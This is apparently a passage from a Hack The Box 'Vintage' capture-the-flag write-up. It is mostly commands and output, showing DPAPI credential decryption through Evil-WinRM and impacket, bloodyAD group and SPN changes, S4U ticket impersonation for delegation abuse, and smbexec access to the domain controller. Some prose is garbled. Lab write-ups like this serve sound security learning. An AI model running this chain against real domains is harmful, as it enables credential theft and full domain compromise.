*Evil-WinRM* PS C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials> dir -h
 
 
    Directory: C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials
 
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          6/7/2024   5:08 PM            430 C4BB96844A5C9DD45D5B6A9859252BA6

*Evil-WinRM* PS C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials>download C4BB96844A5C9DD45D5B6A9859252BA6
```

```
*Evil-WinRM* PS C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115> dir -h

Directory: C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115
 
 
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-         12/4/2024   2:46 AM            740 1fe00192-86ec-4689-a4f2-f8c2336edaf4
-a-hs-          6/7/2024   1:17 PM            740 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
-a-hs-          6/7/2024   1:17 PM            740 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
-a-hs-          6/7/2024   1:17 PM            904 BK-VINTAGE
-a-hs-         12/4/2024   2:46 AM             24 Preferred

*Evil-WinRM* PS C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115> download 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
```
Then enter the decryption 
```
impacket-dpapi masterkey -file 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne
[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)
 
Decrypted key with User Key (MD4 protected)
Decrypted key: 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
 
└─# impacket-dpapi credential -file C4BB96844A5C9DD45D5B6A9859252BA6 -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
[CREDENTIAL]
LastWritten : 2024-06-07 15:08:23
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000001 (CRED_TYPE_GENERIC)
Target      : LegacyGeneric:target=admin_acc
Description : 
Unknown     : 
Username    : vintage\c.neri_adm
Unknown     : Uncr4ck4bl3P4ssW0rd0312
```
password for user c.neri_adm is Uncr4ck4bl3P4ssW0rd0312
![[VINTAGE BLOODHOUND6.png]]
The next step is to add C.NERL_ADM to DELEGATEDADMINS because delegatedadmins can access all services of dc01 on behalf of any account. Just use (serviePrincipleName)
BBCD ABUSE is fine, but deleRatedadmins. itself must have an SPN •Otherwise kde. will report an error. G.Neri_adm. itself does not have this attribute
Therefore, we need to find a way to add this attribute. Once this attribute is added, we will have a way to use the controlled account to access the service of DCO1. Since DCO1 is a domain controller, this target machine is a single domain, so it can access services on all domains. Of course, this cannot directly obtain root permissions, but it can access the CIFS of DC01. This is an early version of smb. We can use root access permissions to read root.txt in c$ (powershell cannot be executed, which is equivalent to obtaining the Take high privileges for activities in smb).
However, trying to add an SPN to C.Neri adm itself will fail

We can use C.Neri to add SPN to serviceaccount and then use C.Neri_adm to move to delegated admins group, so you can use this serviceaccount to implement RBCD ABUSE (this
serviceaccount should be svc_sql Because we only know its password)
```
bloodyAD --host dc01.vintage.htb --dc-ip 10.10.11.45 -d "VINTAGE.HTB" -u c.neri_adm -p 'Uncr4ck4bl3P4ssW0rd0312' -k add groupMember "DELEGATEDADMINS" "SVC_SQL"  
[+] SVC_SQL added to DELEGATEDADMINS
```

```
bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k set object "SVC_SQL" servicePrincipalName  -v "cifs/fake"
```

```
bloodyAD --host dc01.vintage.htb -d vintage.htb -u 'C.Neri' -p Zer0the0ne -k --dc-ip 10.10.11.45 remove uac svc_sql -f ACCOUNTDISABLE
[-] ['ACCOUNTDISABLE'] property flags removed from svc_sql's userAccountControl
```
we can now get admin.ccache
```
getST.py -spn "cifs/dc01.vintage.htb" -impersonate administrator -dc-ip 10.10.11.45 -no-pass -k vintage.htb/svc_sql:Zer0the0ne
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
```

```
export KRB5CCNAME=administrator@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
```
If we try login smbclient it doesnt work, we will then use L.Bianchi_adm
```
getST.py -spn "cifs/dc01.vintage.htb" -impersonate L.Bianchi_adm -dc-ip 10.10.11.45 -no-pass -k vintage.htb/svc_sql:Zer0the0ne
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for user
[*] Impersonating L.Bianchi_adm
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in L.Bianchi_adm@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
┌─[au-vip-1]─[10.10.14.2]─[zzac@htb-xng4pqphqw]─[~]
└──╼ [★]$ export KRB5CCNAME=L.Bianchi_adm@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
```
I will now use smbexec.py which works and I'm able to get the root flag 
```
smbexec.py vintage.htb/L.BIANCHI_ADM@dc01.vintage.htb -k -no-pass
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>cd C:\Users
[-] You can't CD under SMBEXEC. Use full paths.
C:\Windows\system32>type C:\Users
Access is denied.

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
635845d57909d940f5b287ded9ab4457

C:\Windows\system32>
```



[[Practice (HTB)]]